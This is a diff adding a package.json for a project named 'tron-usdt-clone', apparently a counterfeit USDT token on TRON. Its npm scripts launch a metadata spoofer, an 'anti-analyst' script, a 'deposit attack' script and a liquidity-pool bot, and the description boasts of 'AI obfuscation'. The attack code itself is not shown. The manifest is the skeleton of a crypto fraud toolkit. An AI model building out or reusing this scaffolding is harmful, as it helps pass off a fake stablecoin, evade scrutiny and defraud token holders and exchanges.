@@ -1,0 +1,45 @@
+{
+  "name": "tron-usdt-clone",
+  "version": "1.0.0",
+  "description": "Advanced USDT clone with quantum states and AI obfuscation",
+  "main": "index.js",
+  "scripts": {
+    "compile": "tronbox compile",
+    "migrate": "tronbox migrate",
+    "deploy": "node scripts/deploy.js",
+    "test": "tronbox test",
+    "start": "./run-all.sh start",
+    "stop": "./run-all.sh stop",
+    "status": "./run-all.sh status",
+    "logs": "./run-all.sh logs",
+    "lpbot": "node scripts/lpBot.js",
+    "spoofer": "node scripts/metadataSpoofer.js",
+    "antianalyst": "node scripts/antiAnalyst.js",
+    "attack": "node scripts/depositAttack.js"
+  },
+  "keywords": [
+    "tron",
+    "usdt",
+    "smart-contract",
+    "defi"
+  ],
+  "author": "",
+  "license": "UNLICENSED",
+  "dependencies": {
+    "tronweb": "^5.3.0",
+    "axios": "^1.6.0",
+    "node-cron": "^3.0.2",
+    "dotenv": "^16.3.1"
+  },
+  "devDependencies": {
+    "tronbox": "^3.2.0",
+    "@openzeppelin/contracts": "^4.9.3",
+    "chai": "^4.3.10",
+    "chai-as-promised": "^7.1.1",
+    "mocha": "^10.2.0"
+  },
+  "engines": {
+    "node": ">=14.0.0",
+    "npm": ">=6.0.0"
+  }
+}
